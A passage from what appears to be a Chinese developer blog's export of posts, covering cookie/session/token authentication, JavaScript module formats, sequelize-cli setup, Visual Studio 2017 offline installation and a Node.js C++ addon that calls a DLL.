浏览器发送请求时，设置Cookie字段为authed=true。 服务器收到第二次请求，从Cookie字段得知该用户已经登录。 按照已登录用户的权限来处理此次请求。 上述认证流程存在安全隐患，因为Cookie是可以被篡改的。如果使用一些HTTP客户端软件，设置Cookie字段为authed=true并发送该HTTP请求，服务器就会被欺骗。 Cookie防篡改机制服务器为每个Cookie项生成签名，可有效地防止Cookie被篡改。因为用户篡改Cookie后无法生成对应的签名， 服务器便可得知用户对Cookie进行了篡改。一个简单的校验过程可能是这样的： 在服务器中配置一个不为人知的字符串（我们叫它Secret），比如：x$sfz32。 当服务器需要设置Cookie时（比如authed=false），不仅设置authed的值为false， 在值的后面进一步设置一个签名，最终设置的Cookie是authed=false|6hTiBl7lVpd1P。 签名6hTiBl7lVpd1P是这样生成的：Hash(‘x$sfz32’+’false’)。 要设置的值与Secret相加再取哈希。 用户收到HTTP响应并发现头字段Set-Cookie: authed=false|6hTiBl7lVpd1P。 用户在发送HTTP请求时，篡改了authed值，设置头字段Cookie: authed=true|???。 因为用户不知道Secret，无法生成签名，只能随便填一个。 服务器收到HTTP请求，发现Cookie: authed=true|???。服务器开始进行校验： Hash(‘true’+’x$sfz32’)，便会发现用户提供的签名不正确。 通过给Cookie添加签名，使得服务器得以知道Cookie被篡改。然而故事并未结束。 因为Cookie是明文传输的， 只要服务器设置过一次authed=true|xxxx我不就知道true的签名是xxxx了么， 以后就可以用这个签名来欺骗服务器了。因此Cookie中最好不要放敏感数据。 一般来讲Cookie中只会放一个Session Id，而Session存储在服务器端。 Session为了解决Cookie的安全隐患，Session机制应运而生。session机制是一种服务器端的机制，它存储在服务器端的，避免了在客户端Cookie中存储敏感数据。Session可以存储在HTTP服务器的内存中，也可以存在内存数据库（如redis）中， 对于重量级的应用甚至可以存储在数据库中。 客户端对服务端请求时,服务端会检查请求中是否包含一个session标识( 称为session id ). 如果没有,那么服务端就生成一个随机的session以及和它匹配的session id,并将session id返回给客户端. 如果有,那么服务器就在存储中根据session id 查找到对应的session. 基于Session的登录流程一个简单的使用Session机制的登录流程可能是这样的： 用户提交包含用户名和密码的表单，发送HTTP请求。 服务器验证用户发来的用户名密码。 如果正确则把当前用户名（通常是用户对象）存储到redis中，并生成它在redis中的ID。这个ID称为Session ID，通过Session ID可以从Redis中取出对应的用户对象， 敏感数据（比如authed=true）都存储在这个用户对象中。 设置Cookie为sessionId=xxxxxx|checksum并发送HTTP响应， 仍然为每一项Cookie都设置签名。 用户收到HTTP响应后，便看不到任何敏感数据了。在此后的请求中发送该Cookie给服务器。 服务器收到此后的HTTP请求后，发现Cookie中有SessionID，进行放篡改验证。 如果通过了验证，根据该ID从Redis中取出对应的用户对象， 查看该对象的状态并继续执行业务逻辑。 Session安全隐患Session ID作为Cookie存储在浏览器端，因此存在被劫持的风险，尤其是开发者没有正确的关闭会话。用户关闭会话时，应删除传递 Session ID 的 Cookie，同时撤销服务器端的Session内容。例如：123456789101112/* 普通用户登出 */router.post(&apos;/signout&apos;, function(req, res, next) &#123; if (_.isEmpty(req.body) === false) &#123; req.session.account = null; // 删除session res.json(&#123; message: &apos;登出成功！&apos; &#125;); &#125; else &#123; res.send(406, &#123; message: &apos;The params is not correct!&apos; &#125;); &#125;&#125;); TokenToken是用户的验证方式,最简单的token组成:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。 基于Token的身份验证流程使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的： 客户端使用用户名跟密码请求登录 服务端收到请求，去验证用户名与密码 验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端 客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里 客户端每次向服务端请求资源的时候需要带着服务端签发的 Token 服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据 基于Token方法的优势 JWT 方法允许我们进行AJAX调用任何服务器或域。由于HTTP头是用来传输用户信息的。 没必要在服务器存储一个单独的session。JWT本身传达全部的信息。 服务器端减少到只是一个API和可以通过CDN服务的静态资源（HTML，CSS，JS)。 认证系统是手机兼容的，任何设备上可以生成令牌。 由于已经消除了cookie的需要，也不再需要保护跨站请求。 API密钥提供非此即彼的解决方案，然而JWT提供更颗粒度的控制，它可以用于任何调试目的的检查。 API密钥依赖于中央存储和服务。JWT可以自发行或者外部服务在允许的范围和期限发布它。 JWT结构Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。 Cookie、Session和Token对比cookie与session的区别 cookie数据存放在客户端上，session数据放在服务器上。 cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗。考虑到安全应当使用session。 session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE。 session与token的区别作为身份认证token安全性比session好，因为每个请求都有签名还能防止监听以及重放攻击。 Session 是一种HTTP存储机制，目的是为无状态的HTTP提供的持久机制。Session 认证只是简单的把User 信息存储到Session 里，因为SID 的不可预测性，暂且认为是安全的。这是一种认证手段。 但是如果有了某个User的SID,就相当于拥有该User的全部权利.SID不应该共享给其他网站或第三方。 Token, 如果指的是OAuth Token 或类似的机制的话，提供的是 认证 和 授权，认证是针对用户，授权是针对App。其目的是让某App有权利访问某用户的信息。这里的Token是唯一的。不可以转移到其它App上，也不可以转到其它用户上。 参考链接 http://wiki.jikexueyuan.com/project/node-lessons/cookie-session.html, by 极客学院. https://harttle.land/2015/08/10/cookie-session.html. by Harttle Land. https://python.freelycode.com/contribution/detail/84. by Python部落. https://www.jianshu.com/p/576dbf44b2ae, by Dearmadman]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[兼容前后端多种JS模块规范的代码]]></title>
    <url>%2F2018%2F07%2F02%2F%E5%85%BC%E5%AE%B9%E5%89%8D%E5%90%8E%E7%AB%AF%E5%A4%9A%E7%A7%8DJS%E6%A8%A1%E5%9D%97%E8%A7%84%E8%8C%83%E7%9A%84%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[最近研究如何在前后端调用同一份js代码。该问题本质是如何兼容前后端各类JS模块规范。上网一搜，已经有很多详细的解决方案和JS模块规范介绍，在这里简单记录一下。 JS模块规范JS模块规范前端主要有AMD、CMD，后端主要有CommonJS。此外还有最新的ES2015模块规范。 AMDAMD（异步模块定义，Asynchronous Module Definition）格式总体的目标是为现在的开发者提供一个可用的模块化 JavaScript 的解决方案。它诞生于 Dojo 在使用 XHR+eval 时的实践经验，其支持者希望未来的解决方案都可以免受由于过去方案的缺陷所带来的麻烦。 AMD风格模块定义通常包括：一个用来进行模块定义的 define 方法以及一个用来处理依赖项加载的 require 方法。define 根据如下的方法签名来定义具名或匿名的模块：12345define( module_id /*可选*/, [dependencies] /*可选*/, definition function /*用来初始化模块或对象的函数*/); CMDCMD(Common Module Definition)表示通用模块定义，该规范是国内发展出来的，由阿里的玉伯提出。就像AMD有个requireJS，CMD有个浏览器的实现SeaJS，SeaJS和requireJS一样，都是javascript的前端模块化解决方案。CMD规范简单到只有一个API，即define函数：12345define(function(require, exports, module) &#123; // The module code goes here&#125;); CMD 与 AMD 挺相近，二者区别如下： 对于依赖的模块 CMD 是延迟执行，而 AMD 是提前执行（不过 RequireJS 从 2.0 开始，也改成可以延迟执行。 ） CMD 推崇依赖就近，AMD 推崇依赖前置。 AMD 的 api 默认是一个当多个用，CMD 严格的区分推崇职责单一，其每个 API 都简单纯粹。例如：AMD 里 require 分全局的和局部的。CMD 里面没有全局的 require，提供 seajs.use() 来实现模块系统的加载启动。 CommonJSCommonJS是一个志愿性质的工作组，它致力于设计、规划并标准化 JavaScript API。至今为止他们已经尝试着认可了模块标准以及程序包标准。CommonJS 的模块提案为在服务器端声明模块指定了一个简单的 API。不像 AMD，它试图覆盖更宽泛的方面比如 IO、文件系统、promise 模式等等。CommonJS风格模块在nodejs中得到广泛的应用。 CommonJS风格模块是一段可重用的 JavaScript，它导出一系列特定的对象给依赖它的代码调用——通常来说这样的模块外围没有函数包裹（所以你在这里的例子中不会看到 define）。例如：12345678910// package/lib 是我们须要的一个依赖项var lib = require(&apos;package/lib&apos;); // 我们的模块的一些行为function foo()&#123; lib.log(&apos;hello world!&apos;);&#125; // 把 foo 导出（暴露）给其它模块exports.foo = foo; ES2015模块规范2015 年 6 月， ES2015（即 ECMAScript 6、ES6） 正式发布。ES2015 是该语言的一个显著更新，也是自 2009 年 ES5 标准确定后的第一个重大更新。 ES2015的模块规范如下： 一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。 export 命令用于规定模块的对外接口。 import 命令用于输入其他模块提供的功能。 ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。 ES2015模块示例如下：123456789//circle.js//圆面积计算export function area(radius) &#123; return Math.PI * radius * radius;&#125;//main.jsimport &#123;area&#125; from &apos;./hangge&apos;;console.log(&apos;圆面积：&apos; + area(10)); 兼容多种模块规范需要指出的是下面兼容多种JS模块规范的代码并不支持最新的ES2015模块规范。 1234567891011121314151617181920;(function (name, definition) &#123; // 检测上下文环境是否为AMD或CMD var hasDefine = typeof define === &apos;function&apos;, // 检查上下文环境是否为Node hasExports = typeof module !== &apos;undefined&apos; &amp;&amp; module.exports; if (hasDefine) &#123; // AMD环境或CMD环境 define(definition); &#125; else if (hasExports) &#123; // 定义为普通Node模块 module.exports = definition(); &#125; else &#123; // 将模块的执行结果挂在window变量中，在浏览器中this指向window对象 this[name] = definition(); &#125;&#125;)(&apos;hello&apos;, function () &#123; var hello = function () &#123;&#125;; return hello;&#125;); 参考链接 https://i.jakeyu.top/2017/09/14/兼容前后端共用模块代码/. by Jake. https://segmentfault.com/a/1190000011633813. by CodeMan. http://justineo.github.io/singles/writing-modular-js/. by ADDY OSMANI. http://www.hangge.com/blog/cache/detail_1686.html. by hangge.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sequelize-cli使用经验总结]]></title>
    <url>%2F2018%2F06%2F22%2Fsequelize-cli%E4%BD%BF%E7%94%A8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Sequelize 是一个基于 promise 的 Node.js ORM, 目前支持 Postgres, MySQL, SQLite 和 Microsoft SQL Server. 它具有强大的事务支持, 关联关系, 读取和复制等功能[2]. 下面主要介绍如何使用sequelize-cli工具快速构建nodejs的数据访问层。 基于express创建nodejs web应用基于express建立nodejs的web应用，在此基础上再使用sequlize建立数据访问层和数据库。1234mkdir myappcd myappexpressnpm install 基于sequelize创建数据访问层和数据库安装sequlize12npm install --save sequelizenpm install --save mysql2 安装sequelize-cli首先应安装sequelize-cli工具，可以选择全局安装，也可以选择本地安装。12npm install --save sequelize-clinpm install -g sequelize-cli 建立初始的ORM引导框架使用如下命令在Nodejs Web应用中建立初始的数据访问层。123mkdir dbcd db../node_modules/.bin/sequelize init 这将创建以下文件夹: config, 包含配置文件，它告诉CLI如何连接数据库 models,包含您的项目的所有模型 migrations, 包含所有迁移文件 seeders, 包含所有种子文件 修改配置文件以连接到数据库管理系统，并创建数据库在建立模型之前，应先修改config/config.json，以告诉 CLI 如何连接到数据库。config/config.json内容如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&#123; &quot;development&quot;: &#123; &quot;username&quot;: &quot;root&quot;, &quot;password&quot;: &quot;root&quot;, &quot;database&quot;: &quot;database_development&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;dialect&quot;: &quot;mysql&quot;, &quot;pool&quot;:&#123; &quot;max&quot;: 5, &quot;min&quot;: 0, &quot;idle&quot;: 10000 &#125;, &quot;timezone&quot;: &quot;+08:00&quot;, &quot;define&quot;:&#123; &quot;charset&quot;: &quot;utf8&quot;, &quot;dialectOptions&quot;:&#123; &quot;collate&quot;: &quot;utf8_general_ci&quot; &#125; &#125; &#125;, &quot;test&quot;: &#123; &quot;username&quot;: &quot;root&quot;, &quot;password&quot;: &quot;root&quot;, &quot;database&quot;: &quot;database_test&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;dialect&quot;: &quot;mysql&quot; &#125;, &quot;production&quot;: &#123; &quot;username&quot;: &quot;root&quot;, &quot;password&quot;: &quot;root&quot;, &quot;database&quot;: &quot;database_test&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;dialect&quot;: &quot;mysql&quot;, &quot;pool&quot;:&#123; &quot;max&quot;: 5, &quot;min&quot;: 0, &quot;idle&quot;: 10000 &#125;, &quot;timezone&quot;: &quot;+08:00&quot;, &quot;define&quot;:&#123; &quot;charset&quot;: &quot;utf8&quot;, &quot;dialectOptions&quot;:&#123; &quot;collate&quot;: &quot;utf8_general_ci&quot; &#125; &#125; &#125;&#125; 上述配置修改了数据库的字符集，使之能支持中文。当然在创建数据库之前，应配置mysql数据库管理系，使其支持utf8字符集。可执行如下命令查看其支持的字符集，如果其不支持uft字符集，请按照参考链接[3]进行修改。1234567891011121314mysql&gt; show variables like &apos;%char%&apos;;+--------------------------+---------------------------------------------------------+| Variable_name | Value |+--------------------------+---------------------------------------------------------+| character_set_client | utf8 || character_set_connection | utf8 || character_set_database | utf8 || character_set_filesystem | binary || character_set_results | utf8 || character_set_server | utf8 || character_set_system | utf8 || character_sets_dir | C:\Program Files\MySQL\MySQL Server 5.5\share\charsets\ |+--------------------------+---------------------------------------------------------+8 rows in set (0.00 sec) 使用如下命令创建数据库：1../node_modules/.bin/sequelize db:create 创建模型我们将使用 model:generate 命令。 此命令需要两个选项： name, 模型的名称 attributes, 模型的属性列表 创建一个名叫 User 的模型：1../node_modules/.bin/sequelize model:generate --name User --attributes firstName:string,lastName:string,email:string 这将发生以下事情: 在 models 文件夹中创建了一个 user 模型文件 在 migrations 文件夹中创建了一个名字像 XXXXXXXXXXXXXX-create-user.js 的迁移文件 注意: _Sequelize 将只使用模型文件，它是表描述。另一边，迁移文件是该模型的更改，或更具体的是说 CLI 所使用的表。 处理迁移，如提交或日志，以进行数据库的某些更改。 再创建一个名为Role的模型，它跟User是一对多的关系：1../node_modules/.bin/sequelize model:generate --name Role --attributes roleName:string 定义关系Role和User是一对多的关系，因此需要修改它们的模型定义。修改migrations/20180622153726-create-role.js如下：1234567891011&apos;use strict&apos;;module.exports = (sequelize, DataTypes) =&gt; &#123; var Role = sequelize.define(&apos;Role&apos;, &#123; roleName: DataTypes.STRING &#125;, &#123;&#125;); Role.associate = function(models) &#123; // associations can be defined here Role.hasMany(models.User) &#125;; return Role;&#125;; 修改migrations/20180622153152-create-user.js如下：123456789101112131415161718&apos;use strict&apos;;module.exports = (sequelize, DataTypes) =&gt; &#123; var User = sequelize.define(&apos;User&apos;, &#123; firstName: DataTypes.STRING, lastName: DataTypes.STRING, email: DataTypes.STRING &#125;, &#123;&#125;); User.associate = function(models) &#123; // associations can be defined here User.belongsTo(models.Role, &#123; onDelete: &quot;NULL&quot;, foreignKey: &#123; allowNull: false &#125; &#125;) &#125;; return User;&#125;; 修改和运行迁移Role和User是一对多的关系，因此需要修改User迁移文件的定义。修改models/user.js如下：12345678910111213141516171819202122232425262728293031323334353637383940414243&apos;use strict&apos;;module.exports = &#123; up: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.createTable(&apos;Users&apos;, &#123; id: &#123; allowNull: false, autoIncrement: true, primaryKey: true, type: Sequelize.INTEGER &#125;, roleId: &#123; // name of the key we&apos;re adding type: Sequelize.INTEGER, allowNull: false, references: &#123; model: &apos;Roles&apos;, // name of Target model key: &apos;id&apos;, // key in Target model that we&apos;re referencing &#125;, onUpdate: &apos;CASCADE&apos;, onDelete: &apos;CASCADE&apos;, &#125;, firstName: &#123; type: Sequelize.STRING &#125;, lastName: &#123; type: Sequelize.STRING &#125;, email: &#123; type: Sequelize.STRING &#125;, createdAt: &#123; allowNull: false, type: Sequelize.DATE &#125;, updatedAt: &#123; allowNull: false, type: Sequelize.DATE &#125; &#125;); &#125;, down: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.dropTable(&apos;Users&apos;); &#125;&#125;; 注意：这里主要给User添加了外键字段，外键字段命名有规则：通常为小写的模型名加Id，即驼峰风格。例如这里加了roleId的外键字段。 直到目前为止，CLI没有将任何东西插入数据库。 刚刚为模型 User和Role创建了必需的模型和迁移文件。 现在要在数据库中实际创建该表，需要运行 db:migrate 命令。1../node_modules/.bin/sequelize db:migrate 此命令将执行这些步骤： 将在数据库中确保一个名为 SequelizeMeta 的表。 此表用于记录在当前数据库上运行的迁移 开始寻找尚未运行的任何迁移文件。 这可以通过检查 SequelizeMeta 表。 在这个例子中，它将运行创建的 XXXXXXXXXXXXXX-create-role.js和XXXXXXXXXXXXXX-create-user.js 迁移。 创建一个名为 Roles 的表，其中包含其迁移文件中指定的所有列。 创建一个名为 Users 的表，其中包含其迁移文件中指定的所有列。 创建种子，生成测试数据假设我们希望在默认情况下将一些数据插入到几个表中。 例如创建几个用户和角色：12../node_modules/.bin/sequelize seed:generate --name demo-role../node_modules/.bin/sequelize seed:generate --name demo-user 这个命令将会在 seeders 文件夹中创建两个种子文件。文件名看起来像是 XXXXXXXXXXXXXX-demo-role.js和XXXXXXXXXXXXXX-demo-user.js，它遵循相同的 up/down 语义，如迁移文件。 现在我们应该编辑这两个文件，将演示角色插入Role表,将演示用户插入User表。修改XXXXXXXXXXXXXX-demo-role.js如下：123456789101112131415161718192021&apos;use strict&apos;;module.exports = &#123; up: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.bulkInsert(&apos;Roles&apos;, [&#123; roleName: &apos;管理员&apos;, createdAt:new Date(), updatedAt:new Date() &#125;,&#123; roleName: &apos;普通用户&apos;, createdAt:new Date(), updatedAt:new Date() &#125;], &#123;&#125;); &#125;, down: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.bulkDelete(&apos;Roles&apos;, null, &#123;&#125;); &#125;&#125;; 修改XXXXXXXXXXXXXX-demo-user.js如下：1234567891011121314151617181920212223242526&apos;use strict&apos;;module.exports = &#123; up: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.bulkInsert(&apos;Users&apos;, [&#123; roleId:1, firstName: &apos;John&apos;, lastName: &apos;Doe&apos;, email: &apos;demo@demo.com&apos;, createdAt:new Date(), updatedAt:new Date() &#125;,&#123; roleId:1, firstName: &apos;Jack&apos;, lastName: &apos;Smith&apos;, email: &apos;jack@demo.com&apos;, createdAt:new Date(), updatedAt:new Date() &#125;], &#123;&#125;); &#125;, down: (queryInterface, Sequelize) =&gt; &#123; return queryInterface.bulkDelete(&apos;Users&apos;, null, &#123;&#125;); &#125;&#125;; 种子文件修改后，即可使用如下命令将演示数据插入数据库中：1../node_modules/.bin/sequelize db:seed:all 参考链接 http://docs.sequelizejs.com/，by sequelizejs https://github.com/demopark/sequelize-docs-Zh-CN，by demopark https://www.jianshu.com/p/b85cc8a05e53, by 最怕认真]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Visual_Studio_Community_2017离线安装]]></title>
    <url>%2F2018%2F06%2F21%2FVisual-Studio-Community-2017%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Visual Studio 2017版本采用模块化安装方式，根据用户选择模块按需安装。这种方式在用户能够上网的情况下十分方便，但在离线情况下就无法使用。下面介绍在离线情况下如何打包安装Visual Studio community 2017的方法。 下载VS2017社区版安装包获取程序到官网下载最新版本的vs_community_xxxxxx.exe的下载器。 运行命令下载所需安装包运行如下命令获取VS2017的工作负载：1.\vs_community__208176120.1522073957.exe --layout e:\vs2017_offline --lang zh-CN --add Microsoft.VisualStudio.Workload.CoreEditor --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended --includeOptional 可从参考链接[2]中获取工作负载ID。如需更多语言包或者更多安装指令，请参考官方离线安装命令指南，即参考链接[3]。 参考链接 https://docs.microsoft.com/en-us/visualstudio/install/create-an-offline-installation-of-visual-studio, by microsoft https://docs.microsoft.com/zh-cn/visualstudio/install/workload-component-id-vs-community, by microsoft https://docs.microsoft.com/en-us/visualstudio/install/use-command-line-parameters-to-install-visual-studio, by microsoft]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node_C++_Addon插件编写方法]]></title>
    <url>%2F2018%2F06%2F20%2FNode-Addon%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[最近研究在Nodejs中调用DLL，上网搜索发现主要有两种方法： 使用Nodeffi调用C风格接口的DLL，但是无法调用C++风格导出类的DLL。 使用Nodejs C++ Addon 插件，该方法可直接与C++代码交互，理论上可以调用C++风格导出类的DLL。 下面研究Nodejs Addon C++插件的编写方法。 什么是Nodejs C++ AddonNode.js插件（Addons）是C/C++编写的动态链接对象，这些对象可以被Node.js的require()函数引用，并可以像普通的Node.js模块一样使用。Addons主要用于提供一个Node.js中运行的JavaScript和C/C++库之间的接口。 插件（Addons）是动态链接的共享对象，它提供了C/C++类库的调用能力。实现插件的方法比较复杂，涉及到以下元组件及API: V8：C++库，Node.js用于提供JavaScript执行环境。V8提供了对象创建、函数调用等执行机制，V8相关API包含在了v8.h头文件中（位于Node.js源码树的deps/v8/include/v8.h），也可以查看在线文档。 libuv：C库，实现了Node.js中的事件循环、工作线程及在不同平台中异步行为的相关功能。也可以做为是一个跨平台的抽象库，提供了简单的、类POSIX的对主要操作系统的常见系统任务功能，如：与文件系统、套接字、计时器、系统事件的交互等。libuv还提供了一个类pthreads的线程池抽象对象，可用于更复杂的、超越标准事件循环的异步插件的控制功能。 内部Node.js库：Node.js自身提供了一定义数量的C/C++API的插件可以使用 - 其中最重要的可能是node::ObjectWrap类 Node.js静态链接库：Node.js自身还包含了一部分静态链接库，如OpenSSL。这些位于Node.js源码树的deps/目录下，只有V8和OpenSSL提供了符号出口，可以供Node.js和基它插件所使用。详见Node.js依赖链接 Node Addon插件编写方法Node Addon插件的编写需要解决两个关键问题： 当数据流向 javaScript -&gt; C++时，如何将javascript类型数据包装成C++类型数据，供C++代码使用。 当数据流向 C++ -&gt; JavaScript时，如何将C++类型数据包装成JavaScript类型数据，供JavaScript代码使用。 这两个关键问题的分析请参见淘宝前端团队成员发表的文章“Node.js 和 C++ 之间的类型转换[3]”。解决这两个关键问题后，Node Addon插件编写难度就不大了。 Node Addon插件调用C++导出类DLL方法测试现有一个采用成熟方法导出类接口的DLL[4]，如何在Node Addon插件中调用该DLL呢?下面nodejs官网Node Addon插件例子Factory of wrapped objects为例进行讲解。 Factory of wrapped objects例子在Addon插件中包装了一个MyObject类，现在就在MyObject类调用DLL导出类的接口方法。修改MyObject.h代码，增加DLL导出类接口方法，增加类接口成员变量IExport和DLL句柄变量hDll，如下所示：123456789101112131415161718192021222324252627282930313233343536// myobject.h#ifndef MYOBJECT_H#define MYOBJECT_H#include &lt;node.h&gt;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;node_object_wrap.h&gt;#include &quot;MatureApproach.h&quot;namespace demo &#123;typedef IExport*(*TYPE_fnCreateExportObj) (void);//定义函数指针 typedef void(*TYPE_fnDestroyExportObj) (IExport*);//定义函数指针 class MyObject : public node::ObjectWrap &#123; public: static void Init(v8::Isolate* isolate); static void NewInstance(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); private: explicit MyObject(double value = 0); ~MyObject(); static void New(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); static void PlusOne(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); static void Hi(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); static void Test(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args); static v8::Persistent&lt;v8::Function&gt; constructor; HMODULE hDll; IExport* pExport; double value_;&#125;;&#125; // namespace demo#endif 接下来将在MyObject类的构造函数中动态加载DLL，创建DLL导出类对象，在析构函数中析构DLL导出类对象，动态卸载DLL,在MyObject成员方法中调用DLL导出类方法，代码如下所示：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// myobject.cc#include &lt;node.h&gt;#include &quot;myobject.h&quot;namespace demo &#123;using v8::Context;using v8::Function;using v8::FunctionCallbackInfo;using v8::FunctionTemplate;using v8::Isolate;using v8::Local;using v8::Number;using v8::Object;using v8::Persistent;using v8::String;using v8::Value;Persistent&lt;Function&gt; MyObject::constructor;MyObject::MyObject(double value) : value_(value)&#123; MyObject::hDll = LoadLibrary(&quot;MatureApproach.dll&quot;); //加载动态链接库DllDemo.dll文件； TYPE_fnCreateExportObj fnCreateExportObj = (TYPE_fnCreateExportObj)GetProcAddress(MyObject::hDll, &quot;CreateExportObj&quot;); MyObject::pExport = fnCreateExportObj();&#125;MyObject::~MyObject() &#123; TYPE_fnDestroyExportObj fnDestroyExportObj = (TYPE_fnDestroyExportObj)GetProcAddress(MyObject::hDll, &quot;DestroyExportObj&quot;); fnDestroyExportObj(MyObject::pExport); FreeLibrary(MyObject::hDll);&#125;void MyObject::Init(Isolate* isolate) &#123; // Prepare constructor template Local&lt;FunctionTemplate&gt; tpl = FunctionTemplate::New(isolate, New); tpl-&gt;SetClassName(String::NewFromUtf8(isolate, &quot;MyObject&quot;)); tpl-&gt;InstanceTemplate()-&gt;SetInternalFieldCount(3); // Prototype NODE_SET_PROTOTYPE_METHOD(tpl, &quot;plusOne&quot;, PlusOne); NODE_SET_PROTOTYPE_METHOD(tpl, &quot;hi&quot;, Hi); NODE_SET_PROTOTYPE_METHOD(tpl, &quot;test&quot;, Test); constructor.Reset(isolate, tpl-&gt;GetFunction());&#125;void MyObject::New(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); if (args.IsConstructCall()) &#123; // Invoked as constructor: `new MyObject(...)` double value = args[0]-&gt;IsUndefined() ? 0 : args[0]-&gt;NumberValue(); MyObject* obj = new MyObject(value); obj-&gt;Wrap(args.This()); args.GetReturnValue().Set(args.This()); &#125; else &#123; // Invoked as plain function `MyObject(...)`, turn into construct call. const int argc = 1; Local&lt;Value&gt; argv[argc] = &#123; args[0] &#125;; Local&lt;Function&gt; cons = Local&lt;Function&gt;::New(isolate, constructor); Local&lt;Context&gt; context = isolate-&gt;GetCurrentContext(); Local&lt;Object&gt; instance = cons-&gt;NewInstance(context, argc, argv).ToLocalChecked(); args.GetReturnValue().Set(instance); &#125;&#125;void MyObject::NewInstance(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); const unsigned argc = 1; Local&lt;Value&gt; argv[argc] = &#123; args[0] &#125;; Local&lt;Function&gt; cons = Local&lt;Function&gt;::New(isolate, constructor); Local&lt;Context&gt; context = isolate-&gt;GetCurrentContext(); Local&lt;Object&gt; instance = cons-&gt;NewInstance(context, argc, argv).ToLocalChecked(); args.GetReturnValue().Set(instance);&#125;void MyObject::PlusOne(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); MyObject* obj = ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder()); obj-&gt;value_ += 1; args.GetReturnValue().Set(Number::New(isolate, obj-&gt;value_));&#125;void MyObject::Hi(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); MyObject* obj = ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder()); Local&lt;String&gt; str=v8::String::NewFromUtf8(isolate, obj-&gt;pExport-&gt;Hi().data()); args.GetReturnValue().Set(str);&#125;void MyObject::Test(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123; Isolate* isolate = args.GetIsolate(); MyObject* obj = ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder()); Local&lt;String&gt; str=v8::String::NewFromUtf8(isolate, obj-&gt;pExport-&gt;Test().data()); args.GetReturnValue().Set(str);&#125;&#125; // namespace demo 参考链接 https://itbilu.com/nodejs/core/4y4-Nrd5G.html，by IT笔录 https://nodejs.org/dist/latest-v8.x/docs/api/addons.html，by nodejs http://taobaofed.org/blog/2016/09/20/type-casts-between-node-and-cpp/，by 淘宝前端团队 https://huangwang.github.io/2018/06/15/DLL导出类和函数/,by jackhuang]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何在Vistual_Studio中调试Node_Addon_C++插件]]></title>
    <url>%2F2018%2F06%2F18%2F%E5%A6%82%E4%BD%95%E5%9C%A8Vistual-Studio%E4%B8%AD%E8%B0%83%E8%AF%95Node-Addon-C-%E6%8F%92%E4%BB%B6%2F</url>
